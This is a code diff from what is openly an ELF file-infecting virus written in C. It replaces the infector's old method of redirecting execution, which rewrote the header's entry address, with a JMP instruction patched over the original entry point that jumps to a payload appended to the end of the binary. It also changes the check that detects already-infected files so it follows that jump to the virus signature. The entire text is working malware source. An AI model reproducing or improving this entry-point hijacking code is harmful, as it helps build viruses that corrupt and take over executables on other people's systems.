@@ -17,6 +17,8 @@
 #include "utils.h"
 #include "virus.h"
 
+#define JMP_INSTRUCTION_SIZE	5
+
 /*
 ** if current binary is already our client, don't infect again ! <3
 */
@@ -26,8 +28,16 @@ static bool	not_infected(const struct entry *original_entry, \
 {
 	const Elf64_Off	sh_offset        = original_entry->safe_shdr->sh_offset;
 	const size_t	entry_offset     = sh_offset + original_entry->offset_in_section;
+
+	uint8_t		*entry_addr = safe(ref, entry_offset, JMP_INSTRUCTION_SIZE);
+
+	if (*entry_addr != 0xe9) return true;
+
+	const int32_t	jmp_rel32   = *(int32_t*)(entry_addr + 1);
+	const size_t	loader_entry_offset = entry_offset + jmp_rel32 + JMP_INSTRUCTION_SIZE;
+
 	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
-	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
+	const size_t	signature_offset = loader_entry_offset + dist_entry_header + sizeof(struct virus_header);
 	char	 	*signature       = safe(ref, signature_offset, SIGNATURE_LEN);
 
 	if (!signature) return errors(ERR_VIRUS, _ERR_ALREADY_INFECTED);
@@ -50,10 +60,20 @@ static bool	change_entry(struct safe_ptr ref, const struct entry *original_entry
 	const size_t		payload_offset    = original_entry->end_of_last_section;
 	const Elf64_Xword	payload_distance  = payload_offset - entry_off;
 
-	Elf64_Addr		e_entry = clone_hdr->e_entry;
+	void			*entry_addr = safe(ref, entry_off, 16);
+	struct jump
+	{
+		uint8_t		opcode;
+		int32_t		rel32;
+	}__attribute((packed))	jump;
+	jump.opcode = 0xe9;
+	jump.rel32  = payload_distance - sizeof(jump);
+	memcpy(entry_addr, &jump, sizeof(jump));
 
-	e_entry += payload_distance;
-	clone_hdr->e_entry = e_entry;
+	// Elf64_Addr		e_entry = clone_hdr->e_entry;
+
+	// e_entry += payload_distance;
+	// clone_hdr->e_entry = e_entry;
 
 	return true;
 }
